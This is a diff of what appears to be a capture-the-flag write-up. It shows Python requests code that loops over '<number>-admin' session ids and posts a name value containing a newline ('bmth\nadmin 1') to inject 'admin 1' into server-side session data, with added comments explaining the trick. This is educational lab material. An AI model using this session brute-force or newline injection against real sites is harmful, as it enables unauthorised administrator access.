@@ -56,7 +56,6 @@ for i in range(641):
         print(response.text)
         break
 ```
-
 ### TLDR
 
 - we run a for loop ranging from 1 to 640 and we apply the loop in `<number>-admin` 
@@ -88,12 +87,14 @@ print("="*80)
 response= session.post(url,data={"name":"bmth\nadmin 1"},auth = (username,password))
 print(response.text)
 print("="*80)
-#exploiting the exlpo
+#exploiting the explode functionality we add a new line and change admin to 1
 
 response= session.post(url,auth = (username,password))
 print(response.text)
 print("="*80)
+#this is just to check if we are still admin or not 
 ```
+they're just splitting up variables line by line and with a space in between each thing we could just as easily add a new line and change whatever session variables we really wanted to
 ### References
 https://www.youtube.com/watch?v=C9yxUTQLbRI
 
